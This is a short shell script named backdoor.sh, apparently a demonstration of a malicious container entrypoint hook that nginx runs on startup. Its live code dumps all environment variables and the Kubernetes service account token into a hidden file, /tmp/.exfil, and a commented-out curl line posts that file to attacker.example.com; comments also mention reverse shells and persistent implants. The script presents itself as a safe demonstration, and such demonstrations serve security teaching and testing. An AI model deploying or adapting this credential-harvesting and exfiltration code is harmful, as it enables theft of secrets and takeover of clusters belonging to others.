#!/bin/sh
# backdoor.sh - placed in /docker-entrypoint.d/ so nginx runs it on startup.
# In a real attack scenario this script would:
#   1. Exfiltrate environment variables (credentials, API keys) to an attacker-controlled server.
#   2. Steal the Kubernetes service account token for API access.
#   3. Establish a reverse shell or install a persistent implant.
#
# This example only writes data locally for safe demonstration.

EXFIL_FILE="/tmp/.exfil"

echo "[backdoor] collecting environment variables..." >&2
env > "$EXFIL_FILE"

echo "[backdoor] collecting service account token..." >&2
SA_TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
if [ -f "$SA_TOKEN_PATH" ]; then
    cat "$SA_TOKEN_PATH" >> "$EXFIL_FILE"
fi

echo "[backdoor] data staged at $EXFIL_FILE" >&2

# In a real attack, exfil to attacker server:
# curl -s -X POST https://attacker.example.com/collect \
#   --data-binary @"$EXFIL_FILE" &
